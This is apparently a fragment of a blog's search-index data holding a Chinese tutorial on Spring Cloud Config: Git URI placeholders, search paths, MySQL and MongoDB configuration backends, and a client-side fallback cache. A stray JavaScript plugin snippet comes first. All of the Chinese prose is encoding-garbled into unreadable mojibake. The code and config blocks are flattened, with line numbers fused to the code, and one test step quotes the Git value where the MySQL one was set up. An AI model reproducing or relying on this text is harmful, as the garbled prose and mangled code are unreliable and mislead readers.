= navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Config å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡",url:"/posts/f1872086.html",text:'ä¸Šç¯‡ - Config å…¥é—¨æ•™ç¨‹ï¼ˆåŸºç¡€ç¯‡ï¼‰ Config å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡ å‰è¨€ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ã€‚ Config ä½¿ç”¨æŠ€å·§æœ¬åœ°å‚æ•°è¦†ç›–è¿œç¨‹å‚æ•°åœ¨æŸäº›æ—¶å€™éœ€è¦ä½¿ç”¨å½“å‰ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡æˆ–è€…æ˜¯åº”ç”¨æœ¬èº«è®¾ç½®çš„å‚æ•°è€Œä¸æ˜¯ä½¿ç”¨è¿œç¨‹æ‹‰å–çš„å‚æ•°ï¼Œæ­¤æ—¶ Config Client å¯ä»¥ä½¿ç”¨å¦‚ä¸‹é…ç½®ï¼š å®˜æ–¹ Bug è§£å†³æ–¹æ¡ˆï¼š https://github.com/spring-cloud/sprmg-cloud-config/issues/651 https://github.com/spring-cloud/spring-cloud-config/issues/359 123456spring: cloud: config: overrideNone: true allowOverride: true overrideSystemProperties: false overrideNoneï¼šå½“ allowOverride ä¸º true æ—¶ï¼ŒoverrideNone è®¾ç½®ä¸º trueï¼Œä»£è¡¨å¤–éƒ¨é…ç½®çš„ä¼˜å…ˆçº§æ›´ä½ï¼Œè€Œä¸”ä¸èƒ½è¦†ç›–ä»»ä½•å·²å­˜åœ¨çš„å±æ€§æºï¼Œé»˜è®¤ä¸º false allowOverrideï¼šæ ‡è¯† overrideSystemProperties å±æ€§æ˜¯å¦å¯ç”¨ï¼Œé»˜è®¤ä¸º trueï¼Œè®¾ç½®ä¸º false è¡¨ç¤ºç¦æ­¢ç”¨æˆ·çš„ä¸ªæ€§åŒ–è®¾ç½® overrideSystemPropertiesï¼šç”¨æ¥æ ‡è¯†å¤–éƒ¨é…ç½®æ˜¯å¦èƒ½å¤Ÿè¦†ç›–ç³»ç»Ÿå±æ€§ï¼Œé»˜è®¤ä¸º true æœåŠ¡ç«¯ Git é…ç½®è¯¦è§£Git ä¸­ URI å ä½ç¬¦Spring Cloud Config Server æ”¯æŒå ä½ç¬¦çš„ä½¿ç”¨ï¼Œæ”¯æŒ ï½›applicationï½ã€{profileï½ã€{labelï½ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥åœ¨é…ç½® uri çš„æ—¶å€™ï¼Œé€šè¿‡å ä½ç¬¦ä½¿ç”¨åº”ç”¨åç§°æ¥åŒºåˆ†åº”ç”¨å¯¹åº”çš„ä»“åº“ç„¶åè¿›è¡Œä½¿ç”¨ã€‚ä¸‹é¢ä¸¾ä¾‹è¯´æ˜ {application} å ä½ç¬¦çš„ä½¿ç”¨ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ Config Server çš„ application.yml é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 123456789101112131415server: port: 9090spring: application: name: config-server cloud: config: server: git: #æ ¹æ®ä¸åŒçš„åº”ç”¨ï¼Œä½¿ç”¨ä¸åŒçš„Gitä»“åº“ï¼Œè¿™é‡Œéœ€è¦ä»“åº“åç§°å’Œä»“åº“ä¸‹é¢çš„é…ç½®æ–‡ä»¶åç§°ä¸€è‡´æ‰å¯ä»¥ uri: https://gitee.com/peter/{application} username: admin password: admin search-paths: book-config Config Client çš„ bootstrap.yml é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 1234567spring: cloud: config: label: master #Gitåˆ†æ”¯çš„åç§° profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ uri: http://localhost:9090 #Config Serverçš„åœ°å€ name: spring-cloud-config #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ ä½¿ç”¨ä¸Šé¢çš„é…ç½®åï¼ŒConfig Client è¯·æ±‚ Config Server ä»“åº“çš„è¿æ¥åœ°å€çš„ uri å˜æˆäº† https://gitee.com/peter/spring-cloud-configï¼Œè¿æ¥åˆ°äº† spring-cloud-config ä»“åº“ï¼›å…¶ä¸­ä»“åº“çš„åç§°æ˜¯ç”± Config Client çš„ spring.cloud.config.name å±æ€§æŒ‡å®šï¼Œè¯·æ±‚çš„é…ç½®æ–‡ä»¶çš„å®Œæ•´è·¯å¾„æ˜¯ https://gitee.com/peter/spring-cloud-config/book-config/spring-cloud-config.ymlï¼›å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦ä»“åº“åç§°å’Œä»“åº“ä¸‹é¢çš„é…ç½®æ–‡ä»¶åç§°ä¸€è‡´æ‰å¯ä»¥ã€‚ è·¯å¾„æœç´¢å ä½ç¬¦Spring Cloud Config Server å¯ä»¥ä½¿ç”¨ searchPaths å‚æ•°è¿›è¡Œè·¯å¾„çš„æœç´¢ï¼Œæ”¯æŒæ ¹æ®è·¯å¾„å’Œè·¯å¾„å‰ç¼€ç­‰æ–¹å¼è¿›è¡Œé…ç½®æ–‡ä»¶çš„è·å–ã€‚ ä¸‹è¿°é…ç½®ä¸­çš„ book-config è¡¨ç¤ºåŒ¹é…å½“å‰è·¯å¾„ä¸‹é¢æ‰€æœ‰çš„é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œbook-config* è¡¨ç¤ºåœ¨ä»¥ book-config ä¸ºå‰ç¼€çš„æ–‡ä»¶å¤¹å†…æœç´¢æ‰€æœ‰é…ç½®æ–‡ä»¶ã€‚ 1234567891011121314server: port: 9090spring: application: name: config-server cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: book-config, book-config* ä¸‹è¿°é…ç½®ä¸­ä½¿ç”¨å ä½ç¬¦çš„å½¢å¼è¿›è¡Œç›®å½•æœç´¢ï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®ä¸åŒçš„é¡¹ç›®ï¼Œå¯¹ä¸åŒçš„é…ç½®æ–‡ä»¶è¿›è¡Œè·¯å¾„æœç´¢ï¼Œä»è€Œå¾ˆå¥½åœ°åˆ’åˆ†é…ç½®æ–‡ä»¶ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå ä½ç¬¦çš„å‰åéœ€è¦åŠ ä¸Šå•å¼•å·ï¼Œå¦åˆ™å ä½ç¬¦æ— æ³•ç”Ÿæ•ˆã€‚ 123456789101112spring: application: name: config-server cloud: config: server: git: #æ ¹æ®ä¸åŒçš„åº”ç”¨ï¼Œæœç´¢ä¸åŒçš„ç›®å½•è·¯å¾„ï¼Œè¿™é‡Œéœ€è¦ç›®å½•åç§°å’Œç›®å½•é‡Œçš„é…ç½®æ–‡ä»¶åç§°ä¸€è‡´æ‰å¯ä»¥ uri: https://gitee.com/peter/spring-cloud-config username: admin password: admin search-paths: \'{application}\' æ¨¡å¼åŒ¹é…å’Œå¤šä¸ªå­˜å‚¨åº“åœ¨ application å’Œ profile çš„ä½¿ç”¨ä¸Šï¼ŒSpring Cloud Config Server è¿˜æ”¯æŒæ›´å¤æ‚é…ç½®æ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ {application}/{profile} è¿›è¡Œè§„åˆ™åŒ¹é…ï¼Œå¤šä¸ªè§„åˆ™éœ€è¦é€šè¿‡é€—å·åˆ†éš”ã€‚ä»¥ä¸‹é…ç½®ä¸­çš„ spring.cloud.config.server.uri æŒ‡æ˜äº†é»˜è®¤çš„ä»“åº“åœ°å€ï¼Œåœ¨ä½¿ç”¨ {application}/{profile} åŒ¹é…ä¸ä¸Šä»»ä½•ä¸€ä¸ªä»“åº“æ—¶ï¼Œä¼šä½¿ç”¨é»˜è®¤çš„ä»“åº“è¿›è¡ŒåŒ¹é…æ¥è·å–ä¿¡æ¯ã€‚å¯¹äº spring-cloud-config-simples åŒ¹é…çš„æ˜¯ spring-cloud-config-simples/*ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å…¶ä»…èƒ½åŒ¹é…åº”ç”¨åç§°ä¸º spring-cloud-config-simples çš„æ‰€æœ‰ profile é…ç½®ï¼›å¯¹äº local çš„ä»“åº“å°†ä¼šåŒ¹é…æ‰€æœ‰çš„åº”ç”¨åä»¥ local å¼€å¤´çš„ Profilesã€‚ 123456789101112131415spring: cloud: config: server: git: uri: https://gitee.com/peter/spring-cloud-config search-paths: SC-BOOK-CONFIG repos: simple: https://gitee.com/peter/simple special: pattern: special*/dev*,*special*/dev* uri: https://gitee.com/peter/spring-cloud-config-special local: pattern: local* uri: /Users/peter/all_test/spring-cloud-config å…³ç³»å‹æ•°æ®åº“çš„é…ç½®ä¸­å¿ƒçš„å®ç°1. åŸºäº MySQL çš„é…ç½®æ¦‚è¿°Spring Cloud Config Server é»˜è®¤æä¾›äº† JDBC çš„æ–¹å¼è¿æ¥ MySQL æ•°æ®åº“ï¼Œæ•´ä½“çš„æµç¨‹å¦‚ä¸‹å›¾ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt; åœ¨ MySQL ä¸­æ‰§è¡Œä¸‹è¿°æ•°æ®åº“è„šæœ¬ï¼Œåˆ›å»ºå¯¹åº”çš„æ•°æ®åº“å’Œè¡¨ï¼Œå¹¶æ’å…¥å¯¹åº”çš„æ•°æ®ï¼š 123456789101112131415161718192021-- åˆ›å»ºæ•°æ®åº“create database `spring-cloud-config` default character set utf8;-- å½“å‰æ•°æ®åº“use `spring-cloud-config`;-- åˆ›å»ºç±»å‹è¡¨CREATE TABLE `PROPERTIES` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` TEXT DEFAULT NULL, `VALUE` TEXT DEFAULT NULL, `APPLICATION` TEXT DEFAULT NULL, `PROFILE` TEXT DEFAULT NULL, `LABLE` TEXT DEFAULT NULL, PRIMARY KEY (`ID`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;-- æ’å…¥æ•°æ®INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'3\', \'cn.springcloud.config\', \'I am the mysql configuration file from dev environment.\', \'config-client\', \'dev\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'4\', \'cn.springcloud.config\', \'I am the mysql configuration file from test environment.\', \'config-client\', \'test\', \'master\');INSERT INTO `spring-cloud-config`.`PROPERTIES` (`ID`, `KEY`, `VALUE`, `APPLICATION`, `PROFILE`, `LABLE`) VALUES (\'5\', \'cn.springcloud.config\', \'I am the mysql configuration file from prod environment.\', \'config-client\', \'prod\', \'master\'); æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå…¶ä¸­ spring.cloud.config.server.jdbc.sql æ˜¯åœ¨è°ƒç”¨æ—¶ä½¿ç”¨çš„ SQLï¼Œspring.profiles.active=jdbc è¡¨ç¤ºä½¿ç”¨çš„æ¿€æ´»æ–¹å¼æ˜¯ JDBCï¼Œspring.cloud.refresh.refreshable=none æ˜¯ç”¨æ¥è§£å†³ DataSource å¾ªç¯ä¾èµ–é—®é¢˜ã€‚è‹¥é¡¹ç›®ä¸­éœ€è¦æ¿€æ´»å…¶ä»– profileï¼Œé‚£ä¹ˆå¯ä»¥æŒ‡å®šå¤šä¸ªï¼Œä¾‹å¦‚ spring.profiles.active=jdbc,devã€‚ 1234567891011121314151617181920212223242526server: port: 8001spring: application: name: config-server cloud: config: server: jdbc: sql: SELECT `KEY`, `VALUE` FROM PROPERTIES WHERE application =? AND profile =? AND lable =? label: master refresh: refreshable: none profiles: active: jdbc datasource: url: jdbc:mysql://127.0.0.1:3306/spring-cloud-config?useUnicode=true&amp;characterEncoding=UTF-8 username: root password: 123456 driver-class-name: com.mysql.jdbc.Driverlogging: level: org.springframework.jdbc.core: DEBUG org.springframework.jdbc.core.StatementCreatorUtils: Trace åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServer æ³¨è§£ï¼š 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} å¯åŠ¨ Config Server åº”ç”¨åï¼Œæµè§ˆå™¨è¾“å…¥ http://127.0.0.1:8001/config-client/dev/master è®¿é—® Config Serverï¼Œæ¥å£è¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š 4. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ MySQL ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼š 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123456server: port: 9090spring: application: name: config-client æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 1234567spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ 5. å…³äºé…ç½®çš„åˆ·æ–°é—®é¢˜æ‰‹åŠ¨åˆ·æ–°å’Œé…ç½®è‡ªåŠ¨åˆ·æ–°å¯¹äº DB ç¯å¢ƒä¸‹æ˜¯å¦åŒæ—¶æ”¯æŒå‘¢ï¼Ÿå¯¹äº DB æ“ä½œæ¥è¯´ï¼Œåœ¨è‡ªåŠ¨åˆ·æ–°æ–¹é¢ï¼Œä¸€èˆ¬æ˜¯åšäº†ç•Œé¢åŒ–çš„é…ç½®å’Œç®¡ç†ï¼Œå½“æˆåŠŸæäº¤é…ç½®åˆ° DB åï¼Œä¼šè°ƒç”¨ Config Server çš„ Spring Cloud Bus åˆ·æ–°æ¥å£ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å’Œ Git çš„ WebHook â€” æ ·çš„æäº¤ç»‘å®šæ‰§è¡ŒåŠŸèƒ½ã€‚ 6. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9090/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environmentï¼Œè¯´æ˜ä¸€åˆ‡è¿è¡Œæ­£å¸¸ éå…³ç³»å‹æ•°æ®åº“çš„é…ç½®ä¸­å¿ƒçš„å®ç°åŸºäº MongoDB çš„é…ç½®æ¦‚è¿°Spring Cloud Config Server å¹¶æ²¡æœ‰æä¾› MongoDB çš„å­˜å‚¨æ–¹å¼ï¼Œä½†æ˜¯ç›®å‰ Spring Cloud å·²ç»æ”¶å½•äº†ä¸€ä¸ªç›¸å…³çš„å­µåŒ–å™¨ã€‚æ•´ä½“çš„æµç¨‹å¦‚ä¸‹å›¾ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªç»™å‡º Config Server å·¥ç¨‹çš„æ ¸å¿ƒé…ç½®å’Œä»£ç ï¼Œè€Œ Config Client å·¥ç¨‹ä¸ä¸Šé¢ MySQL çš„ç¤ºä¾‹åŸºæœ¬ä¸Šä¸€æ ·ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ Config Server å·¥ç¨‹çš„é…ç½®Config Server å·¥ç¨‹çš„ pom.xml æ–‡ä»¶ï¼Œæ·»åŠ  MongoDB çš„ä¾èµ–æ”¯æŒï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server-mongodb&lt;/artifactId&gt; &lt;version&gt;0.0.2.BUILD-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableMongoConfigServerï¼š 12345678@SpringBootApplication@EnableMongoConfigServerpublic class MongoDbConfigServerApplication { public static void main(String[] args) { SpringApplication.run(MongoDbConfigServerApplication.class, args); }} Config Server å·¥ç¨‹é‡Œçš„ application.yml æ–‡ä»¶ 123456789server: port: 8001spring: application: name: config-server data: mongodb: uri: mongodb://localhost/springcloud MongoDB ä¸­çš„æ•°æ®ï¼š 1234567891011{ "label" : "master", "profile" : "dev", "source" : { "cn" : { "springcloud" : { "config" : "I am the mongdb configuration file from dev environment. I will edit." } } }} Config åŠŸèƒ½æ‰©å±•å®¢æˆ·ç«¯å›é€€å®¢æˆ·ç«¯çš„å›é€€æœºåˆ¶ï¼Œå¯ä»¥å¤„ç†ç½‘ç»œä¸­æ–­çš„æƒ…å†µï¼Œæˆ–è€…é…ç½®æœåŠ¡å› ç»´æŠ¤è€Œå…³é—­çš„åœºæ™¯ã€‚å½“å¯ç”¨å›é€€æ—¶ï¼Œå®¢æˆ·ç«¯é€‚é…å™¨å°† â€œç¼“å­˜â€ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„é…ç½®å±æ€§ã€‚è¦å¯ç”¨å›é€€åŠŸèƒ½ï¼Œåªéœ€æŒ‡å®šå­˜å‚¨ç¼“å­˜çš„ä½ç½®å³å¯ï¼›è¿™ä¸ªåŠŸèƒ½ä¹Ÿç§°ä¹‹ä¸ºå®¢æˆ·ç«¯é«˜å¯ç”¨çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯åœ¨æœåŠ¡ç«¯æ— æ³•è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ä¾ç„¶æ˜¯å¯ä»¥ç”¨çš„ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1. å‡†å¤‡å·¥ä½œç”±äºä¸‹é¢çš„ Spring Cloud Config ä½¿ç”¨ Git ä½œä¸ºå­˜å‚¨æ–¹å¼ï¼Œå› æ­¤éœ€è¦æå‰åœ¨ Git è¿œç¨‹ä»“åº“ï¼ˆGithubã€Gitlabï¼‰ä¸­åˆ›å»ºå¯¹åº”çš„ä»“åº“ï¼Œç„¶åå¾€ä»“åº“é‡Œ Push ä¸‰ä¸ªé…ç½®æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlï¼Œé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 2. åˆ›å»º Config Client Fallback Autoconfig å·¥ç¨‹åˆ›å»º Config Client Fallback Autoconfig å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œå…¶ä¸­ spring-security-rsa ä¾èµ–ä¸»è¦æ˜¯ç”¨äºå½“é…ç½®ä¿¡æ¯ä¸­å­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç”¨æˆ·åå¯†ç ï¼‰æ—¶ï¼Œå¯¹æ•æ„Ÿä¿¡æ¯åŠ å¯†åå†ç¼“å­˜åœ¨æœ¬åœ°ï¼š 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.security&lt;/groupId&gt; &lt;artifactId&gt;spring-security-rsa&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Client Fallback Autoconfig å·¥ç¨‹é‡Œçš„ FallbackableConfigServicePropertySourceLocator ç±»ï¼Œä¸»è¦ç”¨æ¥åˆ›å»ºæœ¬åœ°å›é€€æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯åŠ è½½è¿œç¨‹é…ç½®æ–‡ä»¶ååœ¨æœ¬åœ°å¤‡ä»½ä¸€ä»½ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@Order(0)public class FallbackableConfigServicePropertySourceLocator extends ConfigServicePropertySourceLocator { private boolean fallbackEnabled; private String fallbackLocation; @Autowired(required = false) TextEncryptor textEncryptor; public FallbackableConfigServicePropertySourceLocator(ConfigClientProperties defaultProperties, String fallbackLocation) { super(defaultProperties); this.fallbackLocation = fallbackLocation; this.fallbackEnabled = !StringUtils.isEmpty(fallbackLocation); } @Override public PropertySource&lt;?&gt; locate(Environment environment) { PropertySource&lt;?&gt; propertySource = super.locate(environment); if (fallbackEnabled) { if (propertySource != null) { storeLocally(propertySource); } } return propertySource; } private void storeLocally(PropertySource propertySource) { StringBuilder sb = new StringBuilder(); CompositePropertySource source = (CompositePropertySource) propertySource; for (String propertyName : source.getPropertyNames()) { Object value = source.getProperty(propertyName); if (textEncryptor != null) value = "{cipher}" + textEncryptor.encrypt(String.valueOf(value)); sb.append(propertyName).append("=").append(value).append("\\n"); } System.out.println("file contents : " + sb.toString()); saveFile(sb.toString()); } private void saveFile(String contents) { BufferedWriter output = null; File file = new File(fallbackLocation + File.separator + ConfigServerBootstrap.FALLBACK_FILE_NAME); try { if (!file.exists()) { file.createNewFile(); } output = new BufferedWriter(new FileWriter(file)); output.write(contents); } catch (IOException e) { e.printStackTrace(); } finally { if (output != null) { try { output.close(); } catch (IOException e) { System.out.print("Error" + e.getMessage()); } } } }} åˆ›å»º Config Client Fallback Autoconfig å·¥ç¨‹çš„è‡ªåŠ¨é…ç½®ç±»ï¼Œæ·»åŠ ç›¸å…³æ³¨è§£ï¼Œä½¿å…¶åœ¨ Spring Boot å¯åŠ¨çš„æ—¶å€™è¿›è¡ŒåŠ è½½ã€‚å…¶ä¸­ spring.cloud.config.fallbackLocation æ˜¯æŒ‡å›é€€é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è·¯å¾„ï¼Œfile:${spring. cloud.config.fallbackLocation:}/fallback.properties æ˜¯æŒ‡å›é€€é…ç½®æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼š 12345678910111213141516171819202122232425262728293031/** * å®¢æˆ·ç«¯è‡ªåŠ¨é…ç½®ä¾èµ–å¯åŠ¨ */@Configuration@EnableConfigurationProperties@PropertySource(value = {"config-client.properties", "file:${spring.cloud.config.fallbackLocation:}/fallback.properties"}, ignoreResourceNotFound = true)public class ConfigServerBootstrap { public static final String FALLBACK_FILE_NAME = "fallback.properties"; @Autowired private ConfigurableEnvironment environment; @Value("${spring.cloud.config.fallbackLocation:}") private String fallbackLocation; @Bean public ConfigClientProperties configClientProperties() { ConfigClientProperties clientProperties = new ConfigClientProperties(this.environment); clientProperties.setEnabled(false); return clientProperties; } @Bean public FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator() { ConfigClientProperties client = configClientProperties(); FallbackableConfigServicePropertySourceLocator fallbackableConfigServicePropertySourceLocator = new FallbackableConfigServicePropertySourceLocator(client, fallbackLocation); return fallbackableConfigServicePropertySourceLocator; }} åˆ›å»º Config Client Fallback Autoconfig å·¥ç¨‹é‡Œçš„ /src/main/resources/config-client.properties é…ç½®æ–‡ä»¶ï¼š 1spring.cloud.config.enabled=false åˆ›å»º Config Refresh Fallback Autoconfig å·¥ç¨‹é‡Œ /src/main/resources/META-INF/spring.factories é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„è‡ªåŠ¨é…ç½®ç±»ï¼š 12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.fallback.config.ConfigServerBootstrap 3. åˆ›å»º Config Client 